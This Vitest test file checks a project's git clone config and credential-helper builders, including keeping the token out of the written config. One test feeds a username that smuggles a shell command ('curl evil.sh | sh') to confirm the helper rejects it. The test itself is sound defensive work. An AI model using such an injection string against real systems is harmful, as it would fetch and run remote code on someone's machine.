import { describe, it, expect } from 'vitest';
import { gitCredentials } from '../../../shared/git.contract.js';
import {
  cloneCredentialArgs,
  cloneCredentialConfigArgs,
  cloneTrackingConfigArgs,
  credentialHelperValue,
  ORIGIN_FETCH_REFSPEC,
} from '../clone-config.js';

describe('cloneTrackingConfigArgs', () => {
  // A slashed draft name is the everyday case (`<email-localpart>/<slug>`), and
  // the branch lands verbatim inside the config KEY — pin the exact tuples so a
  // future quoting/encoding change can't silently re-point tracking.
  it('emits the tracking tuples for a slashed branch, and keeps gc in the foreground', () => {
    expect(cloneTrackingConfigArgs('feature/x')).toEqual([
      ['config', '--replace-all', 'remote.origin.fetch', ORIGIN_FETCH_REFSPEC],
      ['config', '--replace-all', 'branch.feature/x.remote', 'origin'],
      ['config', '--replace-all', 'branch.feature/x.merge', 'refs/heads/feature/x'],
      // A detached `gc --auto` outlives the command this process waits on and
      // is never reaped; stamped here so existing clones get it on next pull.
      ['config', '--replace-all', 'gc.autoDetach', 'false'],
    ]);
  });
});

describe('credential config', () => {
  const withToken = (username = 'x-access-token') => gitCredentials(username, 'ghp_supersecret');
  const withoutToken = gitCredentials('x-access-token', null);

  it('reads the token from the environment at call time, never inlining its value', () => {
    const helper = credentialHelperValue(withToken());
    expect(helper).toContain('password=$GITHUB_TOKEN');
    expect(helper).not.toContain('ghp_supersecret');
  });

  it('with no token: clones get no helper, and existing clones get theirs UNSET', () => {
    expect(credentialHelperValue(withoutToken)).toBeNull();
    // A fresh clone simply carries nothing…
    expect(cloneCredentialArgs(withoutToken)).toEqual([]);
    // …but an adopted clone may carry a helper from when a token WAS
    // configured, and that stale helper (answering with an empty password)
    // would shadow whatever auth the operator fell back to — so the repair
    // path removes it. Callers run this tolerantly: unset of a missing key
    // exits non-zero and is the expected no-op.
    expect(cloneCredentialConfigArgs(withoutToken)).toEqual([
      ['config', '--unset-all', 'credential.helper', 'password=\\$GITHUB_TOKEN'],
    ]);
  });

  it('never reads this process\'s environment: a token there is not a token in effect', () => {
    const previous = process.env.GITHUB_TOKEN;
    process.env.GITHUB_TOKEN = 'ghp_stale_from_env';
    try {
      expect(credentialHelperValue(withoutToken)).toBeNull();
    } finally {
      if (previous === undefined) delete process.env.GITHUB_TOKEN;
      else process.env.GITHUB_TOKEN = previous;
    }
  });

  it('passes the clone form as --config, which git only honours AFTER the subcommand', () => {
    // Pinned exactly: `-c` here instead of `--config` still authenticates the
    // clone but writes nothing into the new repo, which is the bug this guards.
    expect(cloneCredentialArgs(withToken('oauth2'))).toEqual([
      '--config',
      `credential.helper=${credentialHelperValue(withToken('oauth2'))}`,
    ]);
  });

  it('replaces rather than appends when re-stamping — scoped to app-owned values only', () => {
    // The trailing value-pattern is what keeps an operator's own clone-local
    // helper (store/cache/custom) out of reach of both the replace and the
    // unset — git only touches values matching it.
    expect(cloneCredentialConfigArgs(withToken())).toEqual([
      ['config', '--replace-all', 'credential.helper', credentialHelperValue(withToken()), 'password=\\$GITHUB_TOKEN'],
    ]);
  });

  it('refuses a username that would break out of the helper snippet', () => {
    expect(() => credentialHelperValue(withToken('me"; curl evil.sh | sh; #'))).toThrow(/must match/);
  });
});
